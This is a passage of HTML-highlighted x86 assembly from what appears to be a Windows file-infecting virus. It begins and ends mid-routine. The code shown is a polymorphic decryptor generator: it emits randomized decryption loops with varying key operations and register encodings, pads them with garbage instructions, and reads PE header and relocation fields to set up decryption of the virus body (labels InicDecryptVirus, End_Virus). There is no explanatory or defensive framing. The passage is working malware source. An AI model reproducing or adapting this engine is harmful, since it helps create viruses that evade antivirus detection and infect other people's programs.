                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next03</span><span class="sc0">
      </span><span class="sc5">@@Next02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">
      </span><span class="sc5">@@Next03</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Garbage</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ModifyKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ModifyIndex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Garbage</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Ret</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomCalling</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

      </span><span class="sc5">@@Repeat</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Repeat</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@DecCounter</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SubCounter</span><span class="sc0">
  </span><span class="sc5">@@AddCounter</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C083h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next04</span><span class="sc0">
  </span><span class="sc5">@@SubCounter</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E883h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next04</span><span class="sc0">
  </span><span class="sc5">@@DecCounter</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
     </span><span class="sc5">@@Next04</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DoLongJNZ</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next05</span><span class="sc0">
   </span><span class="sc5">@@DoLongJNZ</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">850Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">@@Next05</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InicDecryptVirus</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">08080808h</span><span class="sc0">
   </span><span class="sc5">@@Next06</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Made</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Garbage2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next06</span><span class="sc0">
    </span><span class="sc5">@@Made</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc5">@@Ret</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc5">@@ModifyKey</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyModification</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ModADD</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@ModSUB</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ModXOR</span><span class="sc0">
     </span><span class="sc5">@@ModROL</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0D1h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@ModADD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C081h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ModNext</span><span class="sc0">
     </span><span class="sc5">@@ModSUB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E881h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ModNext</span><span class="sc0">
     </span><span class="sc5">@@ModXOR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F081h</span><span class="sc0">
     </span><span class="sc5">@@ModNext</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyModifier</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@ModifyIndex</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Add4</span><span class="sc0">
       </span><span class="sc5">@@Lea4</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Dh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc5">@@StoreAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc5">@@Add4</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C083h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@StoreAddition</span><span class="sc0">

</span><span class="sc5">@@SetIndex</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PEHeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@DoMOV</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@SetCounter</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@SetCounter</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">InicDecryptVirus</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@DoMOV</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@SetKey</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptValue2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@DoMOV</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@DoMOV</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DoPureMOV2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@DoPureMOV</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DoPUSHPOP</span><span class="sc0">
     </span><span class="sc5">@@DoLEA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058Dh</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
  </span><span class="sc5">@@StoreValue</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">@@DoPureMOV</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@StoreValue</span><span class="sc0">
  </span><span class="sc5">@@DoPureMOV2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0C7h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@StoreValue</span><span class="sc0">
   </span><span class="sc5">@@DoPUSHPOP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@Garbage2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OneByteWithoutRegister</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@OneByteWithRegister</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@TwoBytes2</span><span class="sc0">

   </span><span class="sc5">@@Garbage_XCHGEAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Garbage_XCHGEAX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndGarbage</span><span class="sc0">

</span><span class="sc5">@@Garbage</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@TwoBytes</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@OneByteWithoutRegister</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndGarbage</span><span class="sc0">

      </span><span class="sc5">@@OneByteWithRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndGarbage</span><span class="sc0">

      </span><span class="sc5">@@OneByteWithoutRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">@@OneByteTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndGarbage</span><span class="sc0">

</span><span class="sc5">@@OneByteTable</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc1">;                       NOP, CMC,  CLC,  STC,  CLD,  STD,  STI,  NOP</span><span class="sc0">

      </span><span class="sc5">@@TwoBytes2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndGarbage</span><span class="sc0">
      </span><span class="sc5">@@TwoBytes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
